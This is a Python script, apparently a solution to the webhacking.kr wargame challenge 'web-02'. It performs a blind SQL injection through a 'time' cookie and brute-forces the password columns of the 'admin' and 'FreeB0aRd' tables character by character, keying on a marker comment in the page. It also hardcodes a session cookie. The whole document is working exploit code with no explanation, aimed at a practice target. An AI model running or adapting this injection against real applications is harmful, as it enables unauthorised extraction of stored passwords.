import requests
import string

url = "http://webhacking.kr/challenge/web/web-02/"

cookie = {"PHPSESSID" : "b27bde118e54f88929c34a40437e79df"}

pw = ''
for i in range(1,10):
    for j in string.printable:
        cookie['time'] = "1531460316 and (select ascii(substr(password,%d,1))=%d from admin)" % (i, ord(j))
        res = requests.get(url, cookies=cookie)
        if "<!--2070-01-01 09:00:01-->" in res.text:
            print("[+] %s" % j)
            pw += j
            print("[+] => %s" % pw)
            break
        else:
            print("[-] %s" % j)


print("[+] admin => %s" % pw)
print('-'*50)
pw = ''

for i in range(1,10):
    for j in string.printable:
        cookie['time'] = "1531460316 and (select ascii(substr(password,%d,1))=%d from FreeB0aRd)" % (i, ord(j))
        res = requests.get(url, cookies=cookie)
        if "<!--2070-01-01 09:00:01-->" in res.text:
            print("[+] %s" % j)
            pw += j
            print("[+] => %s" % pw)
            break
        else:
            print("[-] %s" % j)

print("[+] FreeB0aRd => %s" % pw)
